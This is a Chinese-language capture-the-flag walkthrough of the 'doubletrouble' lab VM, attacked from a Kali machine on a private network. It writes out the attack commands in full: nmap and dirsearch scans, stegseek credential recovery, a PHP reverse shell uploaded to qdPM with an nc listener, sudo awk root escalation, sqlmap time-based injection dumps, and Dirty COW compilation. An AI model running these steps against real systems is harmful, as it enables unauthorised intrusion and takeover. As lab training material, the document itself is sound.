VULHUB靶场实验

实验工具：

fscan：端口扫描工具

nmap：十分好用的端口扫描工具

攻击机：Kali Linux

IP：192.168.12.24

目标机：Debian

IP：192.168.12.158

实验步骤：

步骤1：获取目标IP地址

​ 方法一：使用fscan 扫描一下ip段，获取目标ip为192.168.12.178

​ 方法二：使用Advanced IP Scanner 扫描指定IP段内的机器

​

步骤2：使用Nmap扫描目标开放端口

​ 使用nmap扫描192.168.12.158，发现开放了22、80端口

​ nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt

​

步骤3：访问目标网站

​ 浏览器访问192.168.12.158，发现一个Login页面

​

​ 尝试了弱口令没有效果，这个页面没有办法处理，使用dirsearch扫描目录

用法：dirsearch -u [域名/IP地址] -o [导出文件路径]

​ dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt

​ 使用cat命令筛选出200响应码的路径

​ cat dir.txt | grep 200

​

步骤4：利用stegseek图片解密

​ 在/secret/目录中有个比较奇怪的图片，将它保存到本地

​ 使用stegseek对图片进行解密

​ kali自带了rockyou.txt，但是需要解压一下

​ 使用cat查看解密出的文件，得出账号密码

otisrush@localhost.como
tis666   `

​ 进入之前的登录窗口尝试登录一下，登录成功

​ 之前在翻目录的时候看到install写着qdPM 9.1

qdPM漏洞利用

步骤6：php反弹shell

​ 发现就是用户的myAccount界面的图片那一栏是可以上传文件的，我们上传一个php反弹shell的脚本

​ PHP反弹shell脚本：

上传shell脚本地址：

​ 上传成功后，在kali中开启监听

​ nc -lnvp 4444

​

​ 打开uploads/users中有我们上传到的php脚本，点击php开始执行，shell反弹成功

​

​ 使用python改成伪交互式的shell

​ python -c "import pty;pty.spawn('/bin/bash')"

​

提权

​

​ 查看当前用户能使用sudo的权限 ，可免密执行awk命令

​

​ awk命令可以进行提权

​ sudo awk 'BEGIN{system("/bin/bash")}'

​

​ 进入root目录，ls查看一下，下载doubletrouble.ova

​

​ 首先查看一下是否有python3环境

​ python3 -V

​

​ 使用python3开启一个http服务，然后从本地下载doubeltrouble.ova导入

​ python3 -m http.server 8888

​ 导入后扫描一下ip

目标IP地址：192.168.12.58

​ 使用nmap扫描一下开放端口

​ nmap -A -p- 192.168.12.58

​ 开放端口22、80

​ 访问80端口，发现是一个登录界面

​

​ 尝试使用万能密码，测试是否存在注入

​ 使用burp抓包，导出为txt文件，使用sqlmap测试

​

​ 

 sqlmap跑出 uname存在时间延时盲注

​ 使用sqlmap跑用户名

​ python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10

​

​ sqlmap跑密码

​ python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10

​

​ 尝试在网站上登录，两个都不好使，尝试使用ssh登录

​

​ 登陆成功，查看系统版本内核

​ 使用cat /etc/*-release看到是Debian 7系统

​ Debian 7系统可以通过脏牛提权

github:https://github.com/FireFart/dirtycow

​

​ 在靶机上gcc -v 查看是否有gcc编译环境

​ 传到目标靶机上，然后进行编译

scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58:/tmp

​ gcc -pthread dirty.c -o dirty -lcrypt

​ 然后去执行dirty

​

​ su firefart

​ 登录到firefart上

​ 成功获取到root权限以及flag
